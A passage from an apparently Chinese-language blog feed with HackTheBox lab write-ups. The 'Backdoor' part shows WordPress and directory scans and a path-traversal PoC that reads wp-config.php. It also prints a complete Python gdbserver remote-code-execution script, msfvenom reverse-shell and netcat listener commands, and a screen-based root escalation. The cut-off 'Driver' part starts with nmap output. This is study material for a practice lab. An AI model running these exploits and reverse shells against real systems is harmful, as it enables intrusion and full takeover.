class="line">[+] Started: Wed Jan  5 00:39:16 2022</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://10.10.11.125/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;</span><br><span class="line"> |  - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Latest Version: 2.8 (up to date)</span><br><span class="line"> | Last Updated: 2021-07-22T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt</span><br><span class="line"> | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.8 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#x27;Version: 2.8&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:01:47 &lt;====================================================&gt; (137 / 137) 100.00% Time: 00:01:47</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Wed Jan  5 00:42:56 2022</span><br><span class="line">[+] Requests Done: 180</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 46.386 KB</span><br><span class="line">[+] Data Received: 14.424 MB</span><br><span class="line">[+] Memory used: 234.215 MB</span><br><span class="line">[+] Elapsed time: 00:03:40</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# wpscan --url http://10.10.11.125 --wp-plugins-dir</span><br><span class="line"></span><br><span class="line">Scan Aborted: missing argument: --wp-plugins-dir</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# searchsploit wordpress | grep 5.8.1                                                                                        1 ⨯</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─#  </span><br></pre></td></tr></table></figure><h2 id="0x04-目录扫描"><a href="#0x04-目录扫描" class="headerlink" title="0x04.目录扫描"></a>0x04.目录扫描</h2><p><code>本次使用ffuf，可以发现wp-content，wp-includes，wp-admin的目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://backdoor.htb/FUZZ -t 200</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v1.3.1 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://backdoor.htb/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 200</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> on atleast 2 different hosts [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line">wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]</span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory-list-2.3-medium.txt [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line">                        [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span><br><span class="line"><span class="meta">#</span><span class="bash"> license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This work is licensed under the Creative Commons  [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line">wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]</span><br><span class="line"><span class="meta">#</span><span class="bash"> or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Copyright 2007 James Fisher [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Priority ordered <span class="keyword">case</span> sensative list, <span class="built_in">where</span> entries were found  [Status: 200, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line">wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]</span><br><span class="line">                        [Status: 200, Size: 0, Words: 1, Lines: 1]</span><br><span class="line">[WARN] Caught keyboard interrupt (Ctrl-C)</span><br></pre></td></tr></table></figure><h2 id="0x05-查看插件目录"><a href="#0x05-查看插件目录" class="headerlink" title="0x05.查看插件目录"></a>0x05.查看插件目录</h2><p><code>插件目录plugins默认在wp-content目录下，可以发现ebook-download这么一个插件</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105141157429.png" class><p><code>查看readme.txt，可以发现版本是1.1</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105141515809.png" class><h2 id="0x06-漏洞利用"><a href="#0x06-漏洞利用" class="headerlink" title="0x06.漏洞利用"></a>0x06.漏洞利用</h2><p><code>google大法发现目录遍历漏洞</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105142012159.png" class><p><code>poc</code></p><blockquote><p>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</p></blockquote><img src="/2022/01/05/HTB-Backdoor/image-20220105142835268.png" class><p><code>查看文件，发现user用户</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105143020234.png" class><p><code>遍历/home/user/user.txt没有成功</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105143507828.png" class><h2 id="0x07-1337端口利用"><a href="#0x07-1337端口利用" class="headerlink" title="0x07.1337端口利用"></a>0x07.1337端口利用</h2><h3 id="01-第一种方法，expdb脚本利用"><a href="#01-第一种方法，expdb脚本利用" class="headerlink" title="01.第一种方法，expdb脚本利用"></a>01.第一种方法，expdb脚本利用</h3><p><code>现在安全测试已经到了瓶颈期，接下来我们以1337端口作为突破口，接续Google大法搜索1337端口</code></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc3BlZWRndWlkZS5uZXQvcG9ydC5waHA/cG9ydD0xMzM3">1337端口参考<i class="fa fa-external-link-alt"></i></span></p><p><code>这里我发现了一个gdbserver RCE</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105193344269.png" class><p><code>poc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Usage: python3 &#123;sys.argv[0]&#125; &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">- Victim&#x27;s gdbserver   -&gt;  10.10.10.200:1337</span><br><span class="line">- Attacker&#x27;s listener  -&gt;  10.10.10.100:4444</span><br><span class="line"></span><br><span class="line">1. Generate shellcode with msfvenom:</span><br><span class="line"><span class="meta">$</span><span class="bash"> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=6666 PrependFork=<span class="literal">true</span> -o rev.bin</span></span><br><span class="line"></span><br><span class="line">2. Listen with Netcat:</span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -nlvp 6666</span></span><br><span class="line"></span><br><span class="line">3. Run the exploit:</span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 &#123;sys.argv[0]&#125; 10.10.11.125:1337 rev.bin</span></span><br></pre></td></tr></table></figure><p><code>脚本如下</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checksum</span>(<span class="params">s: str</span>) -&gt; str:</span></span><br><span class="line">    res = sum(map(ord, s)) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;res:<span class="number">2</span>x&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ack</span>(<span class="params">sock</span>):</span></span><br><span class="line">    sock.send(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">sock, s: str</span>) -&gt; str:</span></span><br><span class="line">    sock.send(<span class="string">f&#x27;$<span class="subst">&#123;s&#125;</span>#<span class="subst">&#123;checksum(s)&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    res = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    ack(sock)</span><br><span class="line">    <span class="keyword">return</span> res.decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">sock, payload: str</span>):</span></span><br><span class="line">    send(sock, <span class="string">&#x27;qSupported:multiprocess+;qRelocInsn+;qvCont+;&#x27;</span>)</span><br><span class="line">    send(sock, <span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = send(sock, <span class="string">&#x27;vCont;s&#x27;</span>)</span><br><span class="line">        data = res.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line">        arch, pc = data.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(<span class="string">&#x27;[!] ERROR: Unexpected response. Try again later&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Found x64 arch&#x27;</span>)</span><br><span class="line">        pc = binascii.unhexlify(pc[:pc.index(<span class="string">&#x27;0*&#x27;</span>)])</span><br><span class="line">        pc += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">8</span> - len(pc))</span><br><span class="line">        addr = hex(struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, pc)[<span class="number">0</span>])[<span class="number">2</span>:]</span><br><span class="line">        addr = <span class="string">&#x27;0&#x27;</span> * (<span class="number">16</span> - len(addr)) + addr</span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&#x27;08&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Found x86 arch&#x27;</span>)</span><br><span class="line">        pc = binascii.unhexlify(pc)</span><br><span class="line">        pc += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">4</span> - len(pc))</span><br><span class="line">        addr = hex(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, pc)[<span class="number">0</span>])[<span class="number">2</span>:]</span><br><span class="line">        addr = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - len(addr)) + addr</span><br><span class="line"></span><br><span class="line">    hex_length = hex(len(payload))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[+] Sending payload&#x27;</span>)</span><br><span class="line">    send(sock, <span class="string">f&#x27;M<span class="subst">&#123;addr&#125;</span>,<span class="subst">&#123;hex_length&#125;</span>:<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br><span class="line">    send(sock, <span class="string">&#x27;vCont;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        print(help)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    ip, port = sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    file = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload = f.read().hex()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        print(<span class="string">f&#x27;[!] ERROR: File <span class="subst">&#123;file&#125;</span> not found&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> sock:</span><br><span class="line">        sock.connect((ip, int(port)))</span><br><span class="line">        print(<span class="string">&#x27;[+] Connected to target. Preparing exploit&#x27;</span>)</span><br><span class="line">        exploit(sock, payload)</span><br><span class="line">        print(<span class="string">&#x27;[*] Pwned!! Check your listener&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>得到user.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><img src="/2022/01/05/HTB-Backdoor/image-20220105202853556.png" class><h3 id="02-第二种方法，msf利用"><a href="#02-第二种方法，msf利用" class="headerlink" title="02.第二种方法，msf利用"></a>02.第二种方法，msf利用</h3><p><code>使用exploit/multi/gdb/gdb_server_exec模块进行利用</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105203848648.png" class><h2 id="0x08-提权"><a href="#0x08-提权" class="headerlink" title="0x08.提权"></a>0x08.提权</h2><p><code>尝试sudo -l需要user用户的密码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@Backdoor:/home/user$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">[sudo] password for user: </span><br><span class="line"></span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for user: </span><br><span class="line"></span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for user: </span><br><span class="line"></span><br><span class="line">sudo: 3 incorrect password attempts</span><br><span class="line">user@Backdoor:/home/user$ </span><br></pre></td></tr></table></figure><p><code>查看具有SUID的命令</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">user@Backdoor:/home/user$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">user@Backdoor:/home/user$</span><br></pre></td></tr></table></figure><p><code>screen提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">export TERM=xterm</span><br><span class="line">screen -x root/root</span><br><span class="line"></span><br><span class="line">root@Backdoor:~# whoami</span><br><span class="line">root</span><br><span class="line">root@Backdoor:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@Backdoor:~# cat root.txt</span><br><span class="line">**********************************</span><br><span class="line">root@Backdoor:~# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2022/01/05/HTB-Backdoor/image-20220105130426840.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-driver</title>
    <link href="https://lunamoore.github.io/2021/11/11/HTB-driver/"/>
    <id>https://lunamoore.github.io/2021/11/11/HTB-driver/</id>
    <published>2021-11-11T06:22:48.000Z</published>
    <updated>2021-11-11T06:54:53.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/11/11/HTB-driver/image-20211110125701582.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了80端口及134、445等敏感端口，且-sC参数进行了smb共享文件的匿名登入，但是这台机器并没有开启！</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/driver]</span><br><span class="line">└─# nmap -sC -sV -sT -A 10.10.11.106                                                                                             1 ⨯</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 23:50 EST</span><br><span class="line">Nmap scan report for driver.htb (10.10.11.106)</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|Vista|7|10 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 10 1511 - 1607 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-11-10T11:51:38</span><br><span class="line">|_  start_date: 2021-11-10T04:56:00</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using proto 1/icmp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   711.49 ms 10.10.16.1</span><br><span class="line">2   711.54 ms driver.htb (10.10.11.106)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.21 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>在访问80端口时可以发现需要登入才可以获取到资源</code></p><img src="/2021/11/11/HTB-driver/image-20211110125441140.png" class><p><code>这里弱口令admin:admin登入成功，手动爬虫发现fw_up.php目录可以进行文件上传。</code></p><img src="/2021/11/11/HTB-driver/image-20211110125623201.png" class><h2 id="0x03-SCF-shell-command-file"><a href="#0x03-SCF-shell-command-file" class="headerlink" title="0x03.SCF(shell command file)"></a>0x03.SCF(shell command 